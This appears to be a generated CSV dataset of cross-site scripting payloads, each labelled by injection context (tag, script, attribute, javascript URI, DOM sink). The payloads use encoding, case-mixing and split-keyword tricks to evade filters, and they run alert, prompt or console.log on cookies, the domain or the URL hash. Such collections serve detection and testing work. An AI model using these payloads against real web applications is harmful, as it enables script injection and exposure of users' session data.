payload,context
<img onanimationend=alert(%27XSS%27)/>,tag_injection
%3Cscript%3E/*/alert(document.cookie)%3C/script%3E,script_injection
"""><img on&#97;nim&#97;tionst&#97;rt=prompt(loc&#97;tion.h&#97;sh)>",tag_injection
<img onlo&#97;d=&#97;l&#101;rt('XSS')/>,tag_injection
<scRipT>/X/pRomPt('XSS')</sCriPt>,script_injection
<img onerror=alert('XSS')>,tag_injection
"""><img on&#97;nim&#97;tionst&#97;rt=consol&#101;.log(loc&#97;tion.h&#97;sh)>",tag_injection
<script>/*/alert(1)</script>,script_injection
"""><img onend=alert(location.hash)>",tag_injection
"<img on&#97;nim&#97;tionit&#101;r&#97;tion=confirm(String.fromCh&#97;rCod&#101;(88,83,83))>",tag_injection
' onanimationend=\u0061lert(1) ',attribute_escape
<img on&#101;nd=consol&#101;.log('XSS')/>,tag_injection
""" on&#101;nd=consol&#101;.log(1) """,attribute_escape
%27 onanimationstart=alert(document.cookie) %27,attribute_escape
"""><img onrepeat=confirm(String.fromCharCode(88,83,83))>",tag_injection
"""><img on&#101;nd=&#97;l&#101;rt(String.fromCh&#97;rCod&#101;(88,83,83))>",tag_injection
<img on&#101;rror=consol&#101;.log(1)>,tag_injection
""" onanimationcancel=alert(String.fromCharCode(88,83,83)) """,attribute_escape
<imG oNbeGin=alErt('XSS')/>,tag_injection
"<img onerror=\u0061lert(String.fromCharCode(88,83,83))/>",tag_injection
%27 onanimationstart=alert(1) %27,attribute_escape
""" onb&#101;gin=confirm(String.fromCh&#97;rCod&#101;(88,83,83)) """,attribute_escape
%3Cimg onanimationcancel=alert(document.domain)/%3E,tag_injection
<img onerror=confirm(%27XSS%27)/>,tag_injection
' onr&#101;p&#101;&#97;t=prompt(docum&#101;nt.dom&#97;in) ',attribute_escape
%22 onerror=console.log(document.cookie) %22,attribute_escape
J&#97;VasCriPt:AleRt(DocUmeNt.DomAin),js_uri
"setTimeout(""\u0061lert(document.domain)"",0)",dom_sink
"""><Img onBegIn=ConSolE.lOg(StrIng.frOmCHarCodE(88,83,83))>",tag_injection
javascript:void(console.log(document.domain)),js_uri
document.write(%22<img src=x onerror=console.log(1)>%22),dom_sink
' oNanImaTioNcaNceL=pRomPt(1) ',attribute_escape
%22 onerror=console.log(%27XSS%27) %22,attribute_escape
"""><img onbegin=confirm(String.fromCharCode(88,83,83))>",tag_injection
<scRipT>/*/cOnfIrm(1)</sCriPt>,script_injection
%22><img onbegin=alert(%27XSS%27)>,tag_injection
"""%3E%3Cimg onend=prompt(String.fromCharCode(88,83,83))%3E",tag_injection
' onanimationiteration=confirm('XSS') ',attribute_escape
%22><img onbegin=alert(document.domain)>,tag_injection
<script>consol&#101;.log`'XSS'`</script>,script_injection
%22 onanimationend=alert(1) %22,attribute_escape
"""><img onend=alert('XSS')>",tag_injection
' onanimationiteration=prompt(document.domain) ',attribute_escape
' on&#101;rror=consol&#101;.log(docum&#101;nt.dom&#97;in) ',attribute_escape
"""><Img onAniMatIonIteRatIon=coNsoLe.Log('XSS')>",tag_injection
"""><img onanimationstart=prompt('XSS')>",tag_injection
%22><img onload=confirm(location.hash)>,tag_injection
"""%3E%3Cimg onend=prompt('XSS')%3E",tag_injection
""" onload=console.log(location.hash) """,attribute_escape
%22 onerror=confirm(document.domain) %22,attribute_escape
javascript:alert(1),js_uri
"""><Img onAniMatIonCanCel=prOmpT('XSS')>",tag_injection
<scRipT>/X/aLerT(dOcuMenT.dOmaIn)</sCriPt>,script_injection
"%3Cscript%3E/*/confirm(String.fromCharCode(88,83,83))%3C/script%3E",script_injection
' oNanImaTioNstArt=coNsoLe.Log('XSS') ',attribute_escape
%27 onerror=alert(location.hash) %27,attribute_escape
javascript:void(\u0061lert(location.hash)),js_uri
%3Cimg onanimationstart=console.log(1)%3E,tag_injection
document.body.innerHTML=%22<img src=x onerror=alert(document.cookie)>%22,dom_sink
JavAscRipT:aLerT(1),js_uri
<img on&#101;rror=confirm(1)/>,tag_injection
' oNloAd=ProMpt(doCumEnt.coOkiE) ',attribute_escape
<img on&#101;rror=&#97;l&#101;rt(docum&#101;nt.cooki&#101;)>,tag_injection
""" onanimationiteration=prompt(document.domain) """,attribute_escape
<img onload=console.log(1)>,tag_injection
""" on&#97;nim&#97;tionit&#101;r&#97;tion=prompt(docum&#101;nt.dom&#97;in) """,attribute_escape
<imG oNrePeaT=cOnfIrm(1)/>,tag_injection
' onanimationcancel=alert(location.hash) ',attribute_escape
""" onrepeat=prompt(String.fromCharCode(88,83,83)) """,attribute_escape
"%3Cscript%3E/x/console.log(String.fromCharCode(88,83,83))%3C/script%3E",script_injection
<img onanimationend=confirm(1)/>,tag_injection
"docum&#101;nt.body.inn&#101;rHTML=""<img src=x on&#101;rror=confirm(docum&#101;nt.cooki&#101;)>""",dom_sink
' onanimationend=prompt(document.cookie) ',attribute_escape
<img onrepeat=\u0061lert(1)>,tag_injection
"location.href=""javascr	ipt:alert(document.cookie)""",dom_sink
"<script>//consol&#101;.log(String.fromCh&#97;rCod&#101;(88,83,83))</script>",script_injection
%22 onbegin=confirm(document.domain) %22,attribute_escape
""" onanimationiteration=prompt('XSS') """,attribute_escape
<img onload=\u0061lert('XSS')/>,tag_injection
""" onlo&#97;d=&#97;l&#101;rt(docum&#101;nt.dom&#97;in) """,attribute_escape
%22><img onload=console.log(1)>,tag_injection
"""><img onrepeat=console.log(document.domain)>",tag_injection
%22 onanimationend=console.log(document.domain) %22,attribute_escape
' onanimationcancel=alert('XSS') ',attribute_escape
""" oNrePeaT=pRomPt(DocUmeNt.DomAin) """,attribute_escape
javascr	ipt:void(confirm(1)),js_uri
%3Cimg onload=alert(document.cookie)/%3E,tag_injection
"""><img onanimationend=console.log('XSS')>",tag_injection
"location.href=""javascript:console.log(1)""",dom_sink
<img onanimationend=alert(location.hash)/>,tag_injection
"<img onbegin=prompt(String.fromCharCode(88,83,83))>",tag_injection
<scr	ipt>//prompt(document.domain)</scr	ipt>,script_injection
"""><img onlo&#97;d=confirm(loc&#97;tion.h&#97;sh)>",tag_injection
<imG oNloAd=AleRt('XSS')>,tag_injection
""" onfocus=alert(document.cookie) autofocus=""",attribute_escape
<script>prompt`docum&#101;nt.dom&#97;in`</script>,script_injection
"%3Cimg onanimationstart=prompt(String.fromCharCode(88,83,83))/%3E",tag_injection
j&#97;v&#97;script:confirm(docum&#101;nt.dom&#97;in),js_uri
j&#97;v&#97;script:void(prompt('XSS')),js_uri
JavAscRipT:vOid(alErt('XSS')),js_uri
javascr	ipt:void(prompt(1)),js_uri
%3Cimg onload=prompt('XSS')%3E,tag_injection
"eval(""confirm('XSS')"")",dom_sink
"document.body.innerHTML=""<img src=x onerror=confirm(String.fromCharCode(88,83,83))>""",dom_sink
"""><img onload=prompt(document.domain)>",tag_injection
<script>console.log`location.hash`</script>,script_injection
"location.href=""javascr	ipt:alert(location.hash)""",dom_sink
%22 onrepeat=confirm(document.cookie) %22,attribute_escape
<imG oNbeGin=coNsoLe.Log(doCumEnt.coOkiE)>,tag_injection
' oNanImaTioNenD=pRomPt('XSS') ',attribute_escape
""" onload=prompt(String.fromCharCode(88,83,83)) """,attribute_escape
' oNrePeaT=cOnfIrm(doCumEnt.doMaiN) ',attribute_escape
"%22 onbegin=confirm(String.fromCharCode(88,83,83)) %22",attribute_escape
<img onbegin=alert(1)>,tag_injection
""" on&#97;nim&#97;tionit&#101;r&#97;tion=prompt(loc&#97;tion.h&#97;sh) """,attribute_escape
<script>/*/\u0061lert(1)</script>,script_injection
%3Cimg onload=console.log(document.cookie)/%3E,tag_injection
<imG oNanImaTioNstArt=coNsoLe.Log(doCumEnt.doMaiN)/>,tag_injection
"setTimeout(""alert(String.fromCharCode(88,83,83))"",0)",dom_sink
"""%3E%3Cimg onanimationiteration=alert(document.cookie)%3E",tag_injection
<img on&#97;nim&#97;tionst&#97;rt=&#97;l&#101;rt(1)>,tag_injection
"&#101;v&#97;l(""&#97;l&#101;rt(loc&#97;tion.h&#97;sh)"")",dom_sink
"""><img onbegin=prompt(document.cookie)>",tag_injection
"' oNrePeaT=cOnsOle.loG(STriNg.FroMChArCOde(88,83,83)) '",attribute_escape
""" onbegin=prompt(location.hash) """,attribute_escape
' on&#97;nim&#97;tion&#101;nd=prompt(loc&#97;tion.h&#97;sh) ',attribute_escape
"""%3E%3Cimg onanimationend=prompt(1)%3E",tag_injection
%27 onanimationstart=console.log(document.domain) %27,attribute_escape
"<imG oNbeGin=coNsoLe.Log(StRinG.fRomChaRCoDe(88,83,83))/>",tag_injection
"""><img on&#97;nim&#97;tionc&#97;nc&#101;l=&#97;l&#101;rt(1)>",tag_injection
location.href=%22javascript:confirm(%27XSS%27)%22,dom_sink
""" oNloAd=ProMpt(StRinG.fRomChaRCoDe(88,83,83)) """,attribute_escape
%3Cimg onend=prompt(document.domain)%3E,tag_injection
"""><Img onRepEat=prOmpT(dOcuMenT.dOmaIn)>",tag_injection
%3Cimg onrepeat=alert(document.cookie)%3E,tag_injection
"&#101;v&#97;l(""consol&#101;.log(docum&#101;nt.dom&#97;in)"")",dom_sink
""" onrepeat=console.log(String.fromCharCode(88,83,83)) """,attribute_escape
""" onfocus=&#97;l&#101;rt('XSS') &#97;utofocus=""",attribute_escape
<img onrepeat=prompt(location.hash)>,tag_injection
"""><img on&#97;nim&#97;tionst&#97;rt=&#97;l&#101;rt('XSS')>",tag_injection
<img onb&#101;gin=consol&#101;.log('XSS')>,tag_injection
%3Cimg onrepeat=console.log(1)%3E,tag_injection
""" oNanImaTioNcaNceL=aLerT(STriNg.FroMChArCOde(88,83,83)) """,attribute_escape
<scr	ipt>/*/alert(document.domain)</scr	ipt>,script_injection
"j&#97;v&#97;script:void(confirm(String.fromCh&#97;rCod&#101;(88,83,83)))",js_uri
' onrepeat=alert('XSS') ',attribute_escape
<img onanimationiteration=prompt('XSS')>,tag_injection
<img onbegin=confirm(1)>,tag_injection
%22><img onanimationend=confirm(document.domain)>,tag_injection
<img onanimationcancel=prompt(%27XSS%27)/>,tag_injection
document.write(%22<img src=x onerror=confirm(document.cookie)>%22),dom_sink
"LocAtiOn.HreF=""JavAscRipT:cOnsOle.loG(lOcaTioN.hAsh)""",dom_sink
"SetTimEouT(""AleRt(DocUmeNt.CooKie)"",0)",dom_sink
"""%3E%3Cimg onanimationiteration=console.log(1)%3E",tag_injection
location.href=%22javascript:confirm(location.hash)%22,dom_sink
%27 onerror=alert(document.cookie) %27,attribute_escape
"""%3E%3Cimg onanimationstart=confirm('XSS')%3E",tag_injection
<img onbegin=prompt(%27XSS%27)>,tag_injection
""" oNanImaTioNstArt=coNsoLe.Log('XSS') """,attribute_escape
<img onr&#101;p&#101;&#97;t=&#97;l&#101;rt(1)>,tag_injection
""" on&#101;nd=prompt('XSS') """,attribute_escape
"&#101;v&#97;l(""confirm(docum&#101;nt.dom&#97;in)"")",dom_sink
"' oNanImaTioNitEraTioN=aLerT(STriNg.FroMChArCOde(88,83,83)) '",attribute_escape
<script>/*/&#97;l&#101;rt(docum&#101;nt.dom&#97;in)</script>,script_injection
"<img on&#97;nim&#97;tionst&#97;rt=prompt(String.fromCh&#97;rCod&#101;(88,83,83))/>",tag_injection
""" onanimationcancel=\u0061lert('XSS') """,attribute_escape
"""><img onanimationend=console.log(document.cookie)>",tag_injection
"""><img onrepeat=\u0061lert(document.cookie)>",tag_injection
"s&#101;tTim&#101;out(""&#97;l&#101;rt(docum&#101;nt.dom&#97;in)"",0)",dom_sink
"' on&#97;nim&#97;tionit&#101;r&#97;tion=&#97;l&#101;rt(String.fromCh&#97;rCod&#101;(88,83,83)) '",attribute_escape
%27 onerror=prompt(document.domain) %27,attribute_escape
"eval(""console.log(location.hash)"")",dom_sink
%3Cimg onload=confirm(location.hash)/%3E,tag_injection
%3Cimg onload=prompt(document.cookie)%3E,tag_injection
""" on&#97;nim&#97;tionst&#97;rt=consol&#101;.log(loc&#97;tion.h&#97;sh) """,attribute_escape
' onend=\u0061lert('XSS') ',attribute_escape
"document.write(%22<img src=x onerror=confirm(String.fromCharCode(88,83,83))>%22)",dom_sink
<imG oNenD=cOnfIrm(doCumEnt.coOkiE)/>,tag_injection
"eval(""confirm(location.hash)"")",dom_sink
<img onanimationstart=prompt(document.cookie)>,tag_injection
"' onanimationstart=prompt(String.fromCharCode(88,83,83)) '",attribute_escape
<img onerror=prompt(1)>,tag_injection
<script>/*/&#97;l&#101;rt('XSS')</script>,script_injection
' onanimationstart=alert(document.cookie) ',attribute_escape
"%3Cscript%3Eprompt`String.fromCharCode(88,83,83)`%3C/script%3E",script_injection
<script>//&#97;l&#101;rt('XSS')</script>,script_injection
<img onrepeat=prompt(%27XSS%27)/>,tag_injection
<scr	ipt>console.log`document.domain`</scr	ipt>,script_injection
' oNenD=cOnfIrm(1) ',attribute_escape
j&#97;v&#97;script:void(&#97;l&#101;rt(1)),js_uri
%27 onanimationend=confirm(1) %27,attribute_escape
<scr	ipt>/x/console.log('XSS')</scr	ipt>,script_injection
"""%3E%3Cimg onend=console.log(1)%3E",tag_injection
"<img onanimationcancel=alert(String.fromCharCode(88,83,83))>",tag_injection
"<img onbegin=alert(String.fromCharCode(88,83,83))>",tag_injection
"""><img onbegin=alert(String.fromCharCode(88,83,83))>",tag_injection
"""%3E%3Cimg onload=console.log(1)%3E",tag_injection
<img onerror=console.log(document.cookie)/>,tag_injection
"document.write(""<img src=x onerror=console.log(location.hash)>"")",dom_sink
' oNenD=cOnfIrm('XSS') ',attribute_escape
%3Cimg onanimationiteration=confirm(location.hash)%3E,tag_injection
"<img onbegin=alert(String.fromCharCode(88,83,83))/>",tag_injection
"""><img onend=confirm(String.fromCharCode(88,83,83))>",tag_injection
"""><img onend=prompt(String.fromCharCode(88,83,83))>",tag_injection
"' on&#101;nd=consol&#101;.log(String.fromCh&#97;rCod&#101;(88,83,83)) '",attribute_escape
%27 onanimationiteration=prompt(location.hash) %27,attribute_escape
<img onanimationstart=\u0061lert('XSS')/>,tag_injection
"<img onr&#101;p&#101;&#97;t=consol&#101;.log(String.fromCh&#97;rCod&#101;(88,83,83))>",tag_injection
' on&#97;nim&#97;tionit&#101;r&#97;tion=consol&#101;.log(docum&#101;nt.dom&#97;in) ',attribute_escape
' onr&#101;p&#101;&#97;t=consol&#101;.log(docum&#101;nt.cooki&#101;) ',attribute_escape
"""%3E%3Cimg onbegin=prompt(location.hash)%3E",tag_injection
%3Cimg onanimationend=console.log(location.hash)/%3E,tag_injection
<img on&#101;rror=confirm(docum&#101;nt.dom&#97;in)/>,tag_injection
<img onr&#101;p&#101;&#97;t=&#97;l&#101;rt(docum&#101;nt.cooki&#101;)/>,tag_injection
""" onanimationstart=confirm(String.fromCharCode(88,83,83)) """,attribute_escape
"""><img on&#97;nim&#97;tionit&#101;r&#97;tion=prompt(loc&#97;tion.h&#97;sh)>",tag_injection
' oNerRor=coNfiRm('XSS') ',attribute_escape
"""><img on&#101;rror=&#97;l&#101;rt(1)>",tag_injection
""" oNanImaTioNcaNceL=aLerT(dOcuMenT.cOokIe) """,attribute_escape
"%27 onend=alert(String.fromCharCode(88,83,83)) %27",attribute_escape
%22 onload=alert(1) %22,attribute_escape
"<img on&#101;rror=prompt(String.fromCh&#97;rCod&#101;(88,83,83))/>",tag_injection
' onrepeat=confirm(document.domain) ',attribute_escape
<img on&#101;rror=&#97;l&#101;rt(docum&#101;nt.dom&#97;in)>,tag_injection
<imG oNanImaTioNenD=pRomPt(LocAtiOn.HasH)>,tag_injection
<img onlo&#97;d=consol&#101;.log(docum&#101;nt.cooki&#101;)/>,tag_injection
"document.body.innerHTML=""<img src=x onerror=prompt(document.cookie)>""",dom_sink
<imG oNrePeaT=pRomPt(LocAtiOn.HasH)>,tag_injection
"""><img onrepeat=confirm(document.cookie)>",tag_injection
%22><img onerror=confirm(1)>,tag_injection
"""><img onanimationend=\u0061lert(document.cookie)>",tag_injection
"""><img onb&#101;gin=&#97;l&#101;rt('XSS')>",tag_injection
<img onload=console.log('XSS')>,tag_injection
<img onload=alert(1)/>,tag_injection
%27 onanimationend=console.log(1) %27,attribute_escape
"setTimeout(%22console.log(1)%22,0)",dom_sink
<imG oNanImaTioNenD=cOnsOle.loG(lOcaTioN.hAsh)>,tag_injection
"""><Img onAniMatIonStaRt=ProMpt(StRinG.fRomChaRCoDe(88,83,83))>",tag_injection
"<script>/x/prompt(String.fromCh&#97;rCod&#101;(88,83,83))</script>",script_injection
<scRipT>aLerT('XSS')</scRipT>,script_injection
"%27 onend=console.log(String.fromCharCode(88,83,83)) %27",attribute_escape
%22 onanimationstart=prompt(document.cookie) %22,attribute_escape
<img on&#97;nim&#97;tionst&#97;rt=&#97;l&#101;rt(loc&#97;tion.h&#97;sh)/>,tag_injection
"LocAtiOn.HreF=""JavAscRipT:aLerT(lOcaTioN.hAsh)""",dom_sink
"document.body.innerHTML=""<img src=x onerror=prompt('XSS')>""",dom_sink
""" oNanImaTioNstArt=coNsoLe.Log(1) """,attribute_escape
<imG oNrePeaT=pRomPt(DocUmeNt.DomAin)>,tag_injection
%27 onanimationstart=prompt(document.cookie) %27,attribute_escape
%27 onrepeat=console.log(%27XSS%27) %27,attribute_escape
"document.write(""<img src=x onerror=confirm(1)>"")",dom_sink
"""%3E%3Cimg onload=confirm(document.cookie)%3E",tag_injection
%3Cimg onend=prompt(1)/%3E,tag_injection
location.href=%22javascript:prompt(%27XSS%27)%22,dom_sink
<script>/x/console.log(%27XSS%27)</script>,script_injection
<img onr&#101;p&#101;&#97;t=prompt(loc&#97;tion.h&#97;sh)>,tag_injection
<img onbegin=\u0061lert('XSS')>,tag_injection
""" onrepeat=confirm(String.fromCharCode(88,83,83)) """,attribute_escape
"<scr	ipt>console.log(String.fromCharCode(88,83,83))</scr	ipt>",script_injection
<scRipT>//alErt('XSS')</ScrIpt>,script_injection
%27 onerror=prompt(location.hash) %27,attribute_escape
<imG oNbeGin=coNsoLe.Log('XSS')>,tag_injection
"""%3E%3Cimg onrepeat=console.log(document.domain)%3E",tag_injection
"JavAscRipT:vOid(coNfiRm(StrIng.frOmCHarCodE(88,83,83)))",js_uri
%3Cscript%3Econsole.log(document.cookie)%3C/script%3E,script_injection
' oNanImaTioNcaNceL=pRomPt('XSS') ',attribute_escape
<img onb&#101;gin=confirm(docum&#101;nt.dom&#97;in)/>,tag_injection
"%3Cimg onend=prompt(String.fromCharCode(88,83,83))/%3E",tag_injection
<script>/*/confirm(docum&#101;nt.dom&#97;in)</script>,script_injection
<img onerror=console.log(location.hash)>,tag_injection
""" on&#101;rror=prompt(loc&#97;tion.h&#97;sh) """,attribute_escape
<scRipT>//alErt(loCatIon.haSh)</sCriPt>,script_injection
"""%3E%3Cimg onload=alert(1)%3E",tag_injection
"""><Img onLoaD=aLerT(lOcaTioN.hAsh)>",tag_injection
"""><img on&#97;nim&#97;tionit&#101;r&#97;tion=prompt(1)>",tag_injection
document.body.innerHTML=%22<img src=x onerror=console.log(1)>%22,dom_sink
%3Cimg onbegin=console.log('XSS')%3E,tag_injection
<script>/x/&#97;l&#101;rt(docum&#101;nt.cooki&#101;)</script>,script_injection
' on&#97;nim&#97;tion&#101;nd=prompt(docum&#101;nt.dom&#97;in) ',attribute_escape
"""><Img onRepEat=coNfiRm(DocUmeNt.DomAin)>",tag_injection
"""%3E%3Cimg onend=confirm(document.domain)%3E",tag_injection
"<img on&#97;nim&#97;tionst&#97;rt=prompt(String.fromCh&#97;rCod&#101;(88,83,83))>",tag_injection
"""><img on&#101;nd=prompt('XSS')>",tag_injection
""" onload=confirm(location.hash) """,attribute_escape
"""><img onrepeat=\u0061lert(location.hash)>",tag_injection
javascript:void(alert(location.hash)),js_uri
"""><img onload=prompt('XSS')>",tag_injection
' onanimationstart=\u0061lert(location.hash) ',attribute_escape
"""><Img onLoaD=pRomPt(1)>",tag_injection
%3Cimg onrepeat=prompt(document.cookie)/%3E,tag_injection
""" on&#101;rror=consol&#101;.log(String.fromCh&#97;rCod&#101;(88,83,83)) """,attribute_escape
"location.href=""javascript:prompt(document.domain)""",dom_sink
"<scr	ipt>//confirm(String.fromCharCode(88,83,83))</scr	ipt>",script_injection
<imG oNloAd=AleRt(DocUmeNt.CooKie)/>,tag_injection
<img onanimationstart=alert(1)/>,tag_injection
"""><img onb&#101;gin=consol&#101;.log(docum&#101;nt.dom&#97;in)>",tag_injection
<imG oNanImaTioNcaNceL=pRomPt(1)>,tag_injection
' oNenD=cOnfIrm(doCumEnt.doMaiN) ',attribute_escape
<img onb&#101;gin=prompt('XSS')/>,tag_injection
document.body.innerHTML=%22<img src=x onerror=prompt(document.domain)>%22,dom_sink
"' oNbeGin=coNfiRm(StrIng.frOmCHarCodE(88,83,83)) '",attribute_escape
<img on&#97;nim&#97;tionit&#101;r&#97;tion=prompt(1)/>,tag_injection
<img onanimationcancel=\u0061lert(document.cookie)>,tag_injection
%22 onrepeat=console.log(document.domain) %22,attribute_escape
"<img onanimationstart=confirm(String.fromCharCode(88,83,83))>",tag_injection
"""><img onb&#101;gin=prompt(docum&#101;nt.dom&#97;in)>",tag_injection
%3Cimg onerror=console.log(1)%3E,tag_injection
"""%3E%3Cimg onanimationiteration=alert('XSS')%3E",tag_injection
"""%3E%3Cimg onanimationstart=alert(location.hash)%3E",tag_injection
<img onr&#101;p&#101;&#97;t=consol&#101;.log(docum&#101;nt.dom&#97;in)>,tag_injection
<img onend=confirm(location.hash)/>,tag_injection
%3Cscript%3E/x/console.log(location.hash)%3C/script%3E,script_injection
"""><Img onLoaD=cOnsOle.loG(lOcaTioN.hAsh)>",tag_injection
"""%3E%3Cimg onend=alert('XSS')%3E",tag_injection
<img on&#97;nim&#97;tionit&#101;r&#97;tion=&#97;l&#101;rt(docum&#101;nt.cooki&#101;)/>,tag_injection
"""><img onload=alert('XSS')>",tag_injection
<img onend=alert(location.hash)/>,tag_injection
"""><img onerror=\u0061lert(document.cookie)>",tag_injection
""" onend=console.log(document.cookie) """,attribute_escape
"EvaL(""AleRt('XSS')"")",dom_sink
"""%3E%3Cimg onrepeat=console.log(document.cookie)%3E",tag_injection
<script>alert`1`</script>,script_injection
"""%3E%3Cimg onbegin=console.log(String.fromCharCode(88,83,83))%3E",tag_injection
%27 onanimationcancel=alert(document.domain) %27,attribute_escape
"s&#101;tTim&#101;out(""consol&#101;.log(docum&#101;nt.cooki&#101;)"",0)",dom_sink
""" oNenD=pRomPt(StrIng.frOmCHarCodE(88,83,83)) """,attribute_escape
%3Cimg onanimationend=confirm('XSS')%3E,tag_injection
""" onr&#101;p&#101;&#97;t=confirm(String.fromCh&#97;rCod&#101;(88,83,83)) """,attribute_escape
<scr	ipt>confirm('XSS')</scr	ipt>,script_injection
"<img on&#101;rror=consol&#101;.log(String.fromCh&#97;rCod&#101;(88,83,83))/>",tag_injection
<img onanimationend=alert(document.domain)>,tag_injection
""" onanimationstart=console.log(document.cookie) """,attribute_escape
<imG oNerRor=coNfiRm(LocAtiOn.HasH)>,tag_injection
"DocUmeNt.BodY.iNneRHTML=""<iMg Src=x OneRroR=aLerT(dOcuMenT.cOokIe)>""",dom_sink
javascript:void(prompt('XSS')),js_uri
"<img onlo&#97;d=prompt(String.fromCh&#97;rCod&#101;(88,83,83))>",tag_injection
<img on&#97;nim&#97;tionit&#101;r&#97;tion=confirm('XSS')>,tag_injection
"docum&#101;nt.writ&#101;(""<img src=x on&#101;rror=prompt(docum&#101;nt.dom&#97;in)>"")",dom_sink
%3Cscript%3E/*/console.log(1)%3C/script%3E,script_injection
%22 onload=prompt(document.domain) %22,attribute_escape
""" on&#97;nim&#97;tionst&#97;rt=prompt('XSS') """,attribute_escape
<script>/x/prompt('XSS')</script>,script_injection
' onend=\u0061lert(1) ',attribute_escape
' onerror=prompt(document.domain) ',attribute_escape
"document.body.innerHTML=""<img src=x onerror=console.log(location.hash)>""",dom_sink
""" onanimationstart=alert(location.hash) """,attribute_escape
""" oNanImaTioNenD=cOnsOle.loG('XSS') """,attribute_escape
<img onr&#101;p&#101;&#97;t=prompt(loc&#97;tion.h&#97;sh)/>,tag_injection
<imG oNrePeaT=aLerT(lOcaTioN.hAsh)>,tag_injection
%3Cscript%3E//confirm(document.cookie)%3C/script%3E,script_injection
%22 onerror=confirm(document.cookie) %22,attribute_escape
JavAscRipT:aLerT('XSS'),js_uri
"<script>//prompt(String.fromCharCode(88,83,83))</script>",script_injection
<scRipT>aLerT`'XSS'`</scRipT>,script_injection
<scr	ipt>alert`document.cookie`</scr	ipt>,script_injection
' onanimationend=alert(document.domain) ',attribute_escape
' onload=console.log('XSS') ',attribute_escape
"<img onerror=alert(String.fromCharCode(88,83,83))/>",tag_injection
"""%3E%3Cimg onload=confirm(document.domain)%3E",tag_injection
"""><Img onAniMatIonEnd=coNsoLe.Log(doCumEnt.doMaiN)>",tag_injection
"%3Cscript%3E//console.log(String.fromCharCode(88,83,83))%3C/script%3E",script_injection
%22><img onanimationend=alert(%27XSS%27)>,tag_injection
""" oNfoCus=alErt(loCatIon.haSh) auTofOcuS=""",attribute_escape
' oNrePeaT=pRomPt('XSS') ',attribute_escape
"setTimeout(%22confirm(document.domain)%22,0)",dom_sink
"""%3E%3Cimg onload=alert(document.domain)%3E",tag_injection
J&#97;VasCriPt:ConFirM(1),js_uri
<scr	ipt>prompt`document.domain`</scr	ipt>,script_injection
""" on&#101;rror=&#97;l&#101;rt(loc&#97;tion.h&#97;sh) """,attribute_escape
%22><img onend=console.log(document.cookie)>,tag_injection
<img onerror=alert(1)>,tag_injection
""" onerror=\u0061lert(document.domain) """,attribute_escape
%3Cscript%3Eprompt`document.cookie`%3C/script%3E,script_injection
<img on&#101;rror=consol&#101;.log('XSS')/>,tag_injection
<img onbegin=prompt(document.cookie)>,tag_injection
%22><img onerror=prompt(document.cookie)>,tag_injection
"%3Cimg onerror=alert(String.fromCharCode(88,83,83))/%3E",tag_injection
' on&#97;nim&#97;tion&#101;nd=confirm('XSS') ',attribute_escape
""" onrepeat=prompt(document.domain) """,attribute_escape
""" onanimationend=confirm(location.hash) """,attribute_escape
"<img onanimationstart=alert(String.fromCharCode(88,83,83))>",tag_injection
"<imG oNanImaTioNstArt=prOmpT(STriNg.FroMChArCOde(88,83,83))/>",tag_injection
""" oNanImaTioNenD=cOnfIrm(loCatIon.haSh) """,attribute_escape
"location.href=""javascr	ipt:console.log(document.domain)""",dom_sink
%3Cimg onanimationend=alert(location.hash)/%3E,tag_injection
"""><img on&#97;nim&#97;tion&#101;nd=confirm(String.fromCh&#97;rCod&#101;(88,83,83))>",tag_injection
' oNloAd=ConFirM(dOcuMenT.dOmaIn) ',attribute_escape
"document.write(""<img src=x onerror=\u0061lert(String.fromCharCode(88,83,83))>"")",dom_sink
' onanimationiteration=console.log('XSS') ',attribute_escape
j&#97;v&#97;script:prompt(loc&#97;tion.h&#97;sh),js_uri
<script>/*/consol&#101;.log(docum&#101;nt.cooki&#101;)</script>,script_injection
"""><img on&#101;nd=consol&#101;.log(loc&#97;tion.h&#97;sh)>",tag_injection
<img onr&#101;p&#101;&#97;t=confirm(docum&#101;nt.dom&#97;in)/>,tag_injection
%27 onbegin=confirm(location.hash) %27,attribute_escape
"%22 onbegin=alert(String.fromCharCode(88,83,83)) %22",attribute_escape
%3Cimg onanimationstart=console.log('XSS')/%3E,tag_injection
' on&#97;nim&#97;tionit&#101;r&#97;tion=prompt(docum&#101;nt.dom&#97;in) ',attribute_escape
javascript:confirm(1),js_uri
""" on&#97;nim&#97;tionit&#101;r&#97;tion=consol&#101;.log('XSS') """,attribute_escape
""" onfocus=console.log(String.fromCharCode(88,83,83)) autofocus=""",attribute_escape
"DocUmeNt.WriTe(""<iMg Src=x OneRroR=aLerT(lOcaTioN.hAsh)>"")",dom_sink
' onend=confirm(document.domain) ',attribute_escape
